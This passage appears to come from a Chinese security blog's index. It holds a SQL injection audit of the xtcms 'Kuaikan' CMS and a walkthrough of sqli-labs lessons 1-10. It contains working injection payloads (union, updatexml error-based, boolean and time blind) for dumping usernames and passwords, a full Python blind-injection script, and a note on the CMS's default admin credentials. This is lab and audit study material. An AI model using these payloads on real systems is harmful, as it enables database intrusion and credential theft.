&#39;cms_detail.php?cid&#x3D;0&#39;);\n&#125;\nif (isset($_POST[&#39;shift&#39;])) &#123;\n\tnull_back($_POST[&#39;id&#39;], &#39;请至少选中一项！&#39;);\n\t$s &#x3D; &#39;&#39;;\n\t$id &#x3D; &#39;&#39;;\n\tforeach ($_POST[&#39;id&#39;] as $value) &#123;\n\t\t$id .&#x3D; $s . $value;\n\t\t$s &#x3D; &#39;,&#39;;\n\t&#125;\n\tnull_back($_POST[&#39;shift_target&#39;], &#39;请选择要转移到的频道&#39;);\n\tmysql_query(&#39;update xtcms_vod set d_parent &#x3D; &#39; . $_POST[&#39;shift_target&#39;] . &#39; where d_id in (&#39; . $id . &#39;)&#39;);\n\talert_href(&#39;转移成功!&#39;, &#39;cms_detail.php?cid&#x3D;0&#39;);\n&#125;\n\n简化了一下，其中的include是我后面添加，为了方便验证注入是否成功\n&lt;?php\n\ninclude(&#39;system&#x2F;inc.php&#39;);\n$player &#x3D; base64_decode($_GET[&#39;play&#39;]);\n$tvinfo &#x3D; file_get_contents($player);\n&#x2F;&#x2F; $tvinfo &#x3D; &#39;&lt;h2&gt;&lt;!--片名开始--&gt;厉害了，我的国&quot; and if(1&#x3D;1,sleep(3),0);#&lt;!--片名结束--&gt;&lt;&#x2F;h2&gt;&#39;;\n$tvpm &#x3D; &#39;#&lt;h2&gt;(.*?)&lt;&#x2F;h2&gt;#&#39;;\npreg_match_all($tvpm, $tvinfo, $btarr);\n$title &#x3D; $btarr[1];\n\nif (!empty($title)) &#123;\n\tforeach ($title as $key &#x3D;&gt; $video) &#123;\n\t\t$titile &#x3D; str_replace(&#39;&lt;!--片名开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$title[$key]&#125;&quot;);\n\t\t$titile &#x3D; str_replace(&#39;&lt;!--片名结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$titile&#125;&quot;);\n\t\t&#x2F;&#x2F; $jieshao &#x3D; str_replace(&#39;&lt;!--介绍开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$jj[$key]&#125;&quot;);\n\t\t&#x2F;&#x2F; $jieshao &#x3D; str_replace(&#39;&lt;!--介绍结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$jieshao&#125;&quot;);\n\t\t&#x2F;&#x2F; $zyan &#x3D; str_replace(&#39;&lt;!--主演开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$zhuyan[$key]&#125;&quot;);\n\t\t&#x2F;&#x2F; $zyan &#x3D; str_replace(&#39;&lt;!--主演结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$zyan&#125;&quot;);\n\t\t&#x2F;&#x2F; $pic &#x3D; str_replace(&#39;http:&#x2F;&#x2F;cj.baiwanzy.com&#x2F;LdgImg.php?url&#x3D;&#39;, &#39;&#39;, &quot;&#123;$tupian[$key]&#125;&quot;);\n\t\t$result &#x3D; mysql_query(&#39;select * from xtcms_vod where d_name&#x3D; &quot;&#39; . $titile . &#39;&quot;&#39;);\n\t\t&#x2F;&#x2F; var_dump($result);\n\t\t$str&#x3D; &#39;select * from xtcms_vod where d_name&#x3D; &quot;&#39; . $titile . &#39;&quot;&#39;;\n\t\techo $str;\n\t\t&#x2F;&#x2F; $test&#x3D;mysql_query(&#39;select * from xtcms_vod where d_id&#x3D;4 and if(1&#x3D;1,sleep(3),0);#&quot;&#39;);\n\t\t&#x2F;&#x2F; echo $test;\n\t\t&#x2F;&#x2F; if (mysql_fetch_array($test)) &#123;\n\t\t&#x2F;&#x2F; \techo &#39;1111111&#39;;\n\t\t&#x2F;&#x2F; &#125;else&#123;\n\t\t&#x2F;&#x2F; \techo &#39;22222&#39;;\n\t\t&#x2F;&#x2F; &#125;\n\t&#125;\n&#125;\n?&gt;\n\n可以看到，通过get传入一个base64编码的参数play，这个play是一个远程链接，通过file_get_contents或去其中内容，来进行正则匹配，只要链接中的内容为我们构造的payload就能造成注入漏洞\nhttp://ip:xx.txt 内容\n&lt;h2&gt;&lt;!--片名开始--&gt;厉害了，我的国&quot; and if(1&#x3D;1,sleep(3),0);#&lt;!--片名结束--&gt;&lt;&#x2F;h2&gt;\n\n传入?play=base64encode(‘http://ip:xx.txt&#39;)，页面会延时3秒\n因为这个cms是个采集播放器，所以我开启了远程文件\n传入的是url所以过滤也就没什么用了\n现在就是找到包含了这个文件的文件，其中也包含了数据库配置文件，这样就能正常注入了\n找到了，可惜，只有后台的caijiapi.php\nadmin/caijiapi.php就看关键，包含了前面的漏洞php，同时也包含了数据库配置\n&lt;?php\ninclude(&#39;..&#x2F;system&#x2F;inc.php&#39;);\ninclude(&#39;cms_check.php&#39;);\nerror_reporting(0);\ninclude(&#39;getdata.php&#39;);\n\n同时，也包含了cms_check,php。这不就直接变鸡肋，尝试登录注入一下\n这个验证码能复用，就能爆破了。同时安装时不能设置管理员账号密码，默认管理员账号密码为admin，123456\n注入成功了，前面片名看网站有的片名写上去就行了\nallow_url_fopen 是on才行，这个也是默认开启的吧。\n\n后面那个switch里面的$id也能注，这个$id直接数字型就ok了\nadmin/youlian_edit.php 有但是没用这个文件和刚才那个一样，是被包含使用的，通过$_post传参，过滤了\n不过这个id好像有机会\n&lt;?php\n\nif (isset($_POST[&#39;save&#39;])) &#123;\n\t$_data[&#39;content&#39;] &#x3D; $_POST[&#39;content&#39;];\n\t$_data[&#39;Reply&#39;] &#x3D; $_POST[&#39;Reply&#39;];\n\t$sql &#x3D; &#39;update xtcms_youlian set &#39; . arrtoupdate($_data) . &#39; where id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;修改成功!&#39;, &#39;cms_youlian.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;修改失败!&#39;);\n\t&#125;\n&#125;\n\n测试一下\n&lt;?php\n\ninclude(&#39;system&#x2F;inc.php&#39;);\nif (isset($_POST[&#39;save&#39;])) &#123;\n\t$_data[&#39;content&#39;] &#x3D; $_POST[&#39;content&#39;];\n\t$_data[&#39;Reply&#39;] &#x3D; $_POST[&#39;Reply&#39;];\n\t$sql &#x3D; &#39;update xtcms_youlian set &#39; . arrtoupdate($_data) . &#39; where id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;\n\techo $sql;\n\n&#125;\n?&gt;\n\n\n可以的，只要设置了友链，就能通过这个注入，设置一个友链看看效果\n但是。。。。你妹的，没有使用到这个文件，全局搜索发现包含的model/youlian_edit.php\n但是model下没有这个文件，这个不是有什么问题吧。model下只有youlian.php\n反正也是后台，无所谓了\nadmin/cms_youlian_edit.php这个跟上面那个一样，但是没用\nadmin/model/link_edit.php   有注入可能是版本切换还是什么，前面两个已经没用了，现在的友链是通过link_edit.php来实现的\n&lt;?php\n\nif (isset($_POST[&#39;save&#39;])) &#123;\n\tnull_back($_POST[&#39;l_name&#39;], &#39;请填写链接名称&#39;);\n\tnon_numeric_back($_POST[&#39;l_sort&#39;], &#39;排序必须是数字!&#39;);\n\t$data[&#39;l_name&#39;] &#x3D; $_POST[&#39;l_name&#39;];\n\t$data[&#39;l_logo&#39;] &#x3D; $_POST[&#39;l_logo&#39;];\n\t$data[&#39;l_url&#39;] &#x3D; $_POST[&#39;l_url&#39;];\n\t$data[&#39;l_sort&#39;] &#x3D; $_POST[&#39;l_sort&#39;];\n\t$sql &#x3D; &#39;update xtcms_link set &#39; . arrtoupdate($data) . &#39; where l_id &#x3D; &#39; . $_GET[&#39;l_id&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;链接修改成功!&#39;, &#39;cms_link.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;修改失败!&#39;);\n\t&#125;\n&#125;\n\n这个在两个文件中使用到了\nadmin/cms_link_edit.php这个里面有一句\n$result &#x3D; mysql_query(&#39;select * from xtcms_link where l_id &#x3D; &#39;.$_GET[&#39;l_id&#39;].&#39;&#39;);\n\n更简单，直接传入l_id=2 and if(1=1,sleep(3),0) ，就注入了\nadmin/cms_link.php&lt;?php\n\t\t\t\t\t\t$result &#x3D; mysql_query(&#39;select * from xtcms_link&#39;);\n\t\t\t\t\t\twhile($row &#x3D; mysql_fetch_array($result))&#123;\n\t\t\t\t\t\t?&gt;\n\t\t\t\t\t\t&lt;tr&gt;\n\t\t\t\t\t\t\t&lt;td&gt;&lt;?php echo $row[&#39;l_sort&#39;]?&gt;&lt;&#x2F;td&gt;\n\t\t\t\t\t\t\t&lt;td&gt;\n\t\t\t\t\t\t\t\t&lt;?php if ($row[&#39;l_logo&#39;] !&#x3D; &#39;&#39;) &#123; ?&gt;\n\t\t\t\t\t\t\t\t&lt;a href&#x3D;&quot;&lt;?php echo $row[&#39;l_logo&#39;]?&gt;&quot; target&#x3D;&quot;_blank&quot;&gt;&lt;img src&#x3D;&quot;&lt;?php echo $row[&#39;l_logo&#39;]?&gt;&quot; width&#x3D;&quot;120&quot; height&#x3D;&quot;30&quot; &#x2F;&gt;&lt;&#x2F;a&gt;\n\t\t\t\t\t\t\t\t&lt;?php &#125; ?&gt;\n\t\t\t\t\t\t\t&lt;&#x2F;td&gt;\n\t\t\t\t\t\t\t&lt;td&gt;&lt;?php echo $row[&#39;l_name&#39;]?&gt;&lt;&#x2F;td&gt;\n\t\t\t\t\t\t\t&lt;td&gt;&lt;?php echo $row[&#39;l_url&#39;]?&gt;&lt;&#x2F;td&gt;\n\t\t\t\t\t\t\t&lt;td&gt;&lt;a class&#x3D;&quot;btn btn-info&quot; href&#x3D;&quot;cms_link_edit.php?l_id&#x3D;&lt;?php echo $row[&#39;l_id&#39;]?&gt;&quot;&gt;&lt;span class&#x3D;&quot;icon-edit&quot;&gt; 修改&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&amp;nbsp &lt;a class&#x3D;&quot;btn btn-danger&quot; href&#x3D;&quot;cms_link.php?del&#x3D;&lt;?php echo $row[&#39;l_id&#39;]?&gt;&quot; onclick&#x3D;&quot;return confirm(&#39;确认要删除吗？&#39;)&quot;&gt;&lt;span class&#x3D;&quot;icon-times&quot;&gt; 删除&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;\n\t\t\t\t\t\t&lt;&#x2F;tr&gt;\n\n使用语句查询link的结果，这个直接过\n这个文件包含了\nadmin/model/link.php&lt;?php\n\nif (isset($_GET[&#39;del&#39;])) &#123;\n\t$sql &#x3D; &#39;delete from xtcms_link where l_id &#x3D; &#39; . $_GET[&#39;del&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;删除成功!&#39;, &#39;cms_link.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;删除失败！&#39;);\n\t&#125;\n&#125;\nif (isset($_POST[&#39;save&#39;])) &#123;\n\tnull_back($_POST[&#39;l_name&#39;], &#39;请填写链接名称&#39;);\n\tnon_numeric_back($_POST[&#39;l_sort&#39;], &#39;排序必须是数字!&#39;);\n\t$data[&#39;l_name&#39;] &#x3D; $_POST[&#39;l_name&#39;];\n\t$data[&#39;l_logo&#39;] &#x3D; $_POST[&#39;l_logo&#39;];\n\t$data[&#39;l_url&#39;] &#x3D; $_POST[&#39;l_url&#39;];\n\t$data[&#39;l_sort&#39;] &#x3D; $_POST[&#39;l_sort&#39;];\n\t$str &#x3D; arrtoinsert($data);\n\t$sql &#x3D; &#39;insert into xtcms_link (&#39; . $str[0] . &#39;) values (&#39; . $str[1] . &#39;)&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\t$order &#x3D; mysql_insert_id();\n\t\tif ($_POST[&#39;l_sort&#39;] &#x3D;&#x3D; 0) &#123;\n\t\t\tmysql_query(&#39;update xtcms_link set l_sort &#x3D; &#39; . $order . &#39; where l_id &#x3D; &#39; . $order);\n\t\t&#125;\n\t\talert_href(&#39;链接添加成功!&#39;, &#39;cms_link.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;添加失败!&#39;);\n\t&#125;\n&#125;\n\n跟前面一样，能够注入，但是用的是delete，直接过\nadmin/model/ad.php del&lt;?php\n\nif (isset($_GET[&#39;del&#39;])) &#123;\n\t$sql &#x3D; &#39;delete from xtcms_ad where id &#x3D; &#39; . $_GET[&#39;del&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;删除成功!&#39;, &#39;cms_ad.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;删除失败！&#39;);\n\t&#125;\n&#125;\nif (isset($_POST[&#39;save&#39;])) &#123;\n\tnull_back($_POST[&#39;title&#39;], &#39;请填写广告名称&#39;);\n\t$data[&#39;title&#39;] &#x3D; $_POST[&#39;title&#39;];\n\t$data[&#39;pic&#39;] &#x3D; $_POST[&#39;pic&#39;];\n\t$data[&#39;catid&#39;] &#x3D; $_POST[&#39;catid&#39;];\n\t$str &#x3D; arrtoinsert($data);\n\t$sql &#x3D; &#39;insert into xtcms_ad (&#39; . $str[0] . &#39;) values (&#39; . $str[1] . &#39;)&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;广告添加成功!&#39;, &#39;cms_ad.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;添加失败!&#39;);\n\t&#125;\n&#125;\n\n\ndelete注入\n后面的insert经过了过滤，无法注入\n在cms_ad.php中使用\ncms_ad.phpad_edit.php   有这里使用update，并且没有引号，直接注入\n&lt;?php\n\nif (isset($_GET[&#39;del&#39;])) &#123;\n\t$sql &#x3D; &#39;delete from xtcms_ad where id &#x3D; &#39; . $_GET[&#39;del&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;删除成功!&#39;, &#39;cms_ad.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;删除失败！&#39;);\n\t&#125;\n&#125;\nif (isset($_POST[&#39;save&#39;])) &#123;\n\tnull_back($_POST[&#39;title&#39;], &#39;请填写广告名称&#39;);\n\t$data[&#39;title&#39;] &#x3D; $_POST[&#39;title&#39;];\n\t$data[&#39;pic&#39;] &#x3D; $_POST[&#39;pic&#39;];\n\t$data[&#39;url&#39;] &#x3D; $_POST[&#39;url&#39;];\n\t$data[&#39;catid&#39;] &#x3D; $_POST[&#39;catid&#39;];\n\t$sql &#x3D; &#39;update xtcms_ad set &#39; . arrtoupdate($data) . &#39; where id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;广告修改成功!&#39;, &#39;cms_ad.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;修改失败!&#39;);\n\t&#125;\n&#125;\n\n在cms_ad_edit.php中使用\ncms_ad_edit.php直接传参就行了\nadmin\\model\\admin.php   deldel有，无用\nadmin\\model\\admin_edit.php  有一样，get传参，在cms_admin_edit.php中使用\nadmin\\model\\adwei.php  deladmin\\model\\app.php无\nadmin\\model\\book.php  有id传参\nadmin\\model\\book_edit.php  有id传参\nsystemsystem/library.php过\nsystem/playurl.php过\nsystem/shoufei.php过\n不看后台了，全一样的，全局搜索  .$_GET[‘   传参应该还有一堆，后面只看前台templatetemplate\\wapian\\vlist.php  有没有配置文件，找包含的地方\nucenter过\nwapwap\\bplay  有一样的直接传入id，同时文件里还有一个漏洞函数，使用这个函数的地方可能存在漏洞\nwap\\vlist.php  有直接传入cid\nwap\\pay\\return_url_shang.php  有直接传入\nwap\\pay\\return_url.php  有直接传入\n你妹的，后台一堆，前台很多滤了，干看了有正确的写法，将有的值给双引号包裹了，这里参数的id是数字型，作者考虑了可是写法出错了。\n被背刺了，没想到一样的模板里还能长出个不一样的花参考链接：https://mp.weixin.qq.com/s/udUKexH8gQsJY9thXJ_smQ\n在ucenter/reg.php中，有个奇葩操作，在通过addslashes过滤了，又使用stripslashes除去了转义的反斜杠   ！！！！！！！！\nucenter/reg.php&lt;?php \ninclude(&#39;..&#x2F;system&#x2F;inc.php&#39;);\nif(isset($_SESSION[&#39;user_name&#39;]))&#123;\nheader(&#39;location:index.php&#39;);\n&#125;;\n\t\nif(isset($_POST[&#39;submit&#39;]))&#123;\n$username &#x3D; stripslashes(trim($_POST[&#39;name&#39;]));\n&#x2F;&#x2F; 检测用户名是否存在\n$query &#x3D; mysql_query(&quot;select u_id from xtcms_user where u_name&#x3D;&#39;$username&#39;&quot;);\n\nstripslashes的作用就是除去不需要使用转义\\，真是奇葩\n剩下就是找用到这个函数的地方，也存在注入，然后就是包含漏洞文件的地方也存在注入\n小结：被这一手给惊呆了，以后注意\n吐槽：太菜了，只能啃一下老版本的cms，新版的项目有的实在是太大了，扫描都有几千个，完全看不过来\n","slug":"快看cms-sql注入审计","date":"2022-11-04T07:47:54.000Z","categories_index":"代码审计","tags_index":"PHP","author_index":"Longw"},{"id":"e7ef7d94b3e4c91873147e11ef254294","title":"sql-labs-less1-10","content":"\n\n什么理解总结都不如做题，做多了就有套路了\n答案：https://blog.csdn.net/elephantxiang/article/details/119684515\n全程无图less1： id=’$id’\n单引号报错，ordey by 字段为3\nunion注入需要前面是错误的内容\nuser() database() version()\ngroup_concat() 将所有结果当成一条返回\n获取所有表名\ngroup_concat(table_name) from information_schema.tables where table_schema=database() –+\n获取users表的所有字段名\ngroup_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=database() –+\n获取所有用户名和密码\ngroup_concat(username),group_concat(password) from users –+\nsql注入写入webshellhttps://blog.csdn.net/weixin_43749601/article/details/115280242\nless2：id=$id\nand 1=1， and 1=2\n不用闭合，直接注入 order by 3 –+ \n剩下的和less1一样\nless3：id=(‘$id’)\n使用 ‘) 闭合报错\n加上  –+ 注释  不报错，证明闭合正确\n剩下和less1一样，还是手打一遍，有助于记忆\n-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() –+\n-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database() –+\n-1’) union select 1,group_concat(username),group_concat(password) from users –+\nless4:id=”($id)”\nand 1=1 and 1=2 正常返回\n‘ 闭合 正常返回\n“ 闭合 报错语句有 )\n“) –+  返回正常  闭合正确\n和less1一样，练练\n-1”) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() –+\n-1”) union select 1,2,group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database() –+\n-1”) union select 1,group_concat(username),group_concat(password) from users –+\nless5：and 1=1 and 1=2  正常\n‘  报错\n‘ –+ 正常 ， 闭合成功\n页面只显示 you are in … ，说明是无回显，有报错使用报错注入\nupdatexml() \n函数介绍：https://blog.csdn.net/m0_60988110/article/details/123544853\nupdatexml(xml_doument,XPath_string,new_value)\n第一个参数：XML的内容\n第二个参数：是需要update的位置XPATH路径\n第三个参数：是更新后的内容\n所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式\nconcat() 连接字符串，字符串有一个为null，返回结果为null\n获取数据库名\n1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+\n其中0x7e只是十六进制的分隔符~  \nconcat_ws() 最前面使用0x7e，这样每个内容都会使用0x7e分割\nconcat_ws(0x7e,username,password)    返回 admin123456\n中间写入正常注入语句就行\n获取所有表名\n1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) –+\n如果输出内容有长度限制，可以使用**substr()**函数切割字符串\n1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),1,7),0x7e),1) –+\n返回emails,\n获取users表所有字段\n1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database()),0x7e),1) –+\n获取users表中所有账号\n1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+\n获取users表中所有密码\n1’ and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+\nless6：and 1=1 and 1=2  ‘ 正常\n“ 报错，” –+ 正常  闭合成功\n和less5一样，报错注入\n表名\n1” and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) –+\n字段名\n1” and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database()),0x7e),1) –+\n账号\n1” and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+\n密码\n1” and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+\nless7：正常流程 “ –+ 回显正常，闭合成功，诡哦! 看源码才知道使用 ‘))闭合才是对的\n这个过程应该是，先让他报错，之后再尝试注释，让其显示正常\n这个”  直接显示正常所以不对\n那为啥没有报错，是双引号特性吗?\n这里需要一个mysql终端测试。。。。\n无回显，无报错，显示使用outfile\n可以使用布尔盲注\n1’)) and length(database()) &gt;? –+ \n一个个测试，结果为8\n使用substring提取database()每一个字符，一个个比较获取结果\n1’)) and substring(database(),1,1) = ‘?’ –+\n在length() 里能执行正常语句，获取表名长度\n1’)) and length((select group_concat(table_name) from information_schema.tables where table_schema =database())) &gt; ? –+\n记得括号 () ，结果是29\n一样提取字符\n1’)) and substring((select group_concat(table_name) from information_schema.tables where table_schema =database()),1,1) = ‘?’ –+\n获取字段名长度\n1’)) and length((select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema =database())) &gt; ? –+\n 结果是20，获取字符\n1’)) and substring((select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema =database()),1,1) = ‘?’ –+\n获取账号长度\n1’)) and length((select group_concat(username) from users )) &gt; ? –+\n结果是91，提取账号字符\n1’)) and substring((select group_concat(username) from users )) = ‘?’ –+\n获取密码长度\n1’)) and length((select group_concat(password) from users )) &gt; ? –+\n结果是97，提取密码字符\n1’)) and substring((select group_concat(password) from users )) = ‘?’ –+\n这样弄好麻烦，在条件允许的情况下，阔以用脚本跑，但是脚本也很慢\n在挖src等，只需要证明危害既可\n脚本：# -*— codeing &#x3D; utf-8 -*-\n# @Time :2022-10-28 14:30\n# @Author : longw\n# @File : sqllab7-booleanblind.py\n# @Software : PyCharm\nimport requests\nimport re\n\nbaseurl &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.108:86&#x2F;Less-7&#x2F;?id&#x3D;&quot;\npayload1 &#x3D; &quot;1&#39;)) and length(database()) &gt; &quot;\npayload2 &#x3D; &quot;1&#39;)) and substring(database(),&quot;\npayload3 &#x3D; &quot;1&#39;)) and length((select group_concat(table_name) from information_schema.tables where table_schema &#x3D;database())) &gt; &quot;\npayload4 &#x3D; &quot;1&#39;)) and substring((select group_concat(table_name) from information_schema.tables where table_schema &#x3D;database()),&quot;\npayload5 &#x3D; &quot;,1) &#x3D; &quot;\npayload6 &#x3D; &quot;1&#39;)) and length((select group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; and table_schema &#x3D;database())) &gt; &quot;\npayload7 &#x3D; &quot;1&#39;)) and substring((select group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; and table_schema &#x3D;database()),&quot;\nend &#x3D; &quot; --+&quot;\n\nheaders &#x3D; &#123;\n    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.121 Safari&#x2F;537.36&quot; &#125;\n                    # http request报文头部，根据实际情况填写\nfeatures &#x3D; &#39;You are in.... Use outfile......&#39;\n\nzifu &#x3D; [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;,\n            &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;,&#39;,\n            &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;,\n            &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;]\n#用二分法判断长度快，但是懒得考虑\ndef ScanDatabase():\n    i&#x3D;1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl+payload1+str(i)+end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;数据库长度为：&quot; +str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    #只考虑数据库名全为字母\n    #学习一波大佬生成的列表：https:&#x2F;&#x2F;github.com&#x2F;JacquelinXiang&#x2F;sqli_bool\n    #这个注入结果可能需要等到明年，你妹的\n    # keylist &#x3D; [chr(i) for i in range(33, 127)]  # 包括数字、大小写字母、可见特殊字符\n    database &#x3D; &#39;&#39;\n    k&#x3D;1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl+payload2+ str(k) + payload5 +&quot;&#39;&quot; +j+&quot;&#39;&quot;+ end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers,timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot;+str(k)+&quot;个字符为：&quot;+ str(j))\n                database &#x3D; database + j\n                k &#x3D; k+1\n                break\n            else:\n                #先测试小写就行，反正结果就是小写\n                if j &#x3D;&#x3D; &#39;z&#39;:\n                    print(&quot;第&quot;+str(k)+&quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;x&#39;\n                    k &#x3D; k +1\n                    break\n    print(&quot;数据库名为：&quot;+database)\n\ndef ScanTables():\n    i &#x3D; 1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl + payload3 + str(i) + end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;表名长度为：&quot; + str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    # 只考虑数据库名全为字母\n    database &#x3D; &#39;&#39;\n    k &#x3D; 1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl + payload4 + str(k) + payload5 + &quot;&#39;&quot; + j + &quot;&#39;&quot; + end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot; + str(k) + &quot;个字符为：&quot; + str(j))\n                database &#x3D; database + j\n                k &#x3D; k + 1\n                break\n            else:\n                \n                if j &#x3D;&#x3D; &#39;Z&#39;:\n                    print(&quot;第&quot; + str(k) + &quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;?&#39;\n                    k &#x3D; k + 1\n                    break\n    print(&quot;所有表名为：&quot; + database)\n\ndef ScanColumns():\n    i &#x3D; 1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl + payload6 + str(i) + end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;users表所有字段长度为：&quot; + str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    # 只考虑数据库名全为字母\n    database &#x3D; &#39;&#39;\n    k &#x3D; 1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl + payload7 + str(k) + payload5 + &quot;&#39;&quot; + j + &quot;&#39;&quot; + end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot; + str(k) + &quot;个字符为：&quot; + str(j))\n                database &#x3D; database + j\n                k &#x3D; k + 1\n                break\n            else:\n                if j &#x3D;&#x3D; &#39;Z&#39;:\n                    print(&quot;第&quot; + str(k) + &quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;?&#39;\n                    k &#x3D; k + 1\n                    break\n    print(&quot;users库所有字段名为：&quot; + database)\n\n#其他都一样，后面两个太长不弄了\nScanDatabase()\n# ScanTables()\n# ScanColumns()\n\n#测试\n# response &#x3D; requests.get(baseurl, headers&#x3D;headers)\n# print(response.text)\n# body &#x3D; response.text\n# print(re.search(features, body))\n\nless8：and 1=1 and 1=2 正常\n‘ 报错 ‘ –+ 正常  闭合成功\n又是布尔盲注，和less7一样，改一下payload就行，不弄了\nless9：and 1=1  and 1=2  ‘  “ 都显示正常\n只能尝试时间盲注了\n1’ and if(1=1,sleep(3),0) –+   有很明显的三秒延时，说明是 ‘  闭合\n接下来就是和前面一样的注入尝试\n1’ and if(length(database())&gt;?,sleep(3),0) –+\n剩下的就是替换\nless10：and 1=1 and 1=2 ‘ “ 都正常\n测试时间盲注\n1 and if(1=1,sleep(3),0) –+\n1’ and if(1=1,sleep(3),0) –+\n1” and if(1=1,sleep(3),0) –+   